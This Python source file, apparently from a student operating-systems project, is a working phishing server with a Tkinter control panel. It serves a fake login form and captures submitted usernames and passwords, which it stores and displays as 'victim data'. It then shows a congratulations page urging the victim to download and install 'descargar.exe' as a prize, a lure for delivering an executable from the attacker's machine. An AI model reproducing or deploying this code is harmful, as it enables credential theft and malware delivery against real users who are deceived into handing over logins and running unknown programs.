import http.server
import threading
import tkinter as tk
import urllib.parse
from tkinter import messagebox
from http.server import SimpleHTTPRequestHandler, HTTPServer
import socket

#Ruta absoluta al archivo form.html
DIRECTORY = '/home/jonathan/Desktop/proyecto_so2/utils'
#DIRECTORY = 'C:/Users/Jonathan/Desktop/University/semestre_VII/sistemas_operativos_II/proyecto-so2/utils'

#Variable global para manejar el servidor
httpd = None

hilo = None  #Variable global para el hilo

victim_data=None

def get_local_ipv4():
    try:
        #Se conecta a un servidor externo para determinar la interfaz en uso
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))  #8.8.8.8 es el servir DNS de google
            local_ip = s.getsockname()[0]
        return local_ip
    except Exception as e:
        print(f"Error: {e}")
        return None

class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.path = '/fake_form.html'
        #self.send_response(304)
        return super().do_GET()

    def do_POST(self):
        #Obtener la longitud del contenido enviado
        content_length = int(self.headers['Content-Length'])
        #Leer el contenido enviado
        post_data = self.rfile.read(content_length)
        #Decodificar los datos del formulario
        data = urllib.parse.parse_qs(post_data.decode('utf-8'))

        #Imprimir los datos en la consola (puedes procesarlos como desees)
        username = data.get('username', [''])[0]
        password = data.get('password', [''])[0]
        global victim_data
        victim_data = f"Usuario: {username} | Contraseña: {password}"

        #Responder al cliente
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        local_ipv4 = get_local_ipv4()
        response = f"""<html>
                        <head>
                            <meta charset="UTF-8">
                            <style>
                                body {{
                                    font-family: Arial, sans-serif;
                                    margin: 0;
                                    padding: 0;
                                    display: flex;
                                    justify-content: center;
                                    align-items: center;
                                    flex-direction: column;
                                    width: 100%;
                                    min-height: 100vh;
                                    color: #fff;
                                    background: linear-gradient(45deg, 
                                        #ff0000, #ffff00, #00ff00, #0000ff
                                    );
                                }}
                            </style>
                        </head>
                        <body>
                            <h1>¡Felicidades!</h1>
                            <h3>Muy bien, {username}, ahora instala el archivo para obtener tu premio</h3>
                            <a href='http://{local_ipv4}:9000/descargar.exe' download='descargar.exe'>Click aquí para obtener tu premio</a>
                        </body>
                        </html>"""
        self.wfile.write(response.encode('utf-8'))
        #messagebox.showinfo("Datos victima: ", victim_data)
        #se ejecuta en otro hilo aparte para no detener la solicitud http post a la pagina con el link de descarga
        threading.Thread(target=lambda: messagebox.showinfo("Datos víctima", victim_data),daemon=True).start()

def actualizar_consola_http_server(server_entry):
    global victim_data
    server_entry.insert(tk.END, f"Datos de la victima: {victim_data}\n")

def start_http_server_en_hilo(server_entry):
    """Inicia el servidor HTTP en un hilo separado."""
    global httpd, hilo

    def start_http_server():
        global httpd

        import os
        os.chdir(DIRECTORY)

        server_entry.delete("1.0", tk.END)
        server_entry.insert(tk.END, f"Iniciando servidor HTTP en el puerto {9000}, sirviendo {DIRECTORY}...\n")
        
        handler = CustomHTTPRequestHandler
        #httpd = socketserver.TCPServer(("", 9000), handler)

        httpd = HTTPServer(('0.0.0.0', 9000), handler)

        local_ipv4 = get_local_ipv4()

        server_entry.insert(tk.END, f"Servidor corriendo en http://{local_ipv4}:{9000}.\n")

        httpd.timeout = 1  # Configura un tiempo de espera para las conexiones
        httpd.serve_forever()


    hilo = threading.Thread(target=start_http_server)
    hilo.daemon = True  #Permite que el hilo se detenga al cerrar la aplicación
    hilo.start()

def stop_http_server(server_entry):
    global httpd
    if httpd:
        server_entry.insert(tk.END, "Deteniendo el servidor...\n")
        try:
            httpd.socket.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass  #El socket ya podría estar cerrado
        httpd.server_close()
        httpd = None
        server_entry.insert(tk.END, "Servidor detenido.\n")
    else:
        server_entry.insert(tk.END, "El servidor no está en ejecución.\n")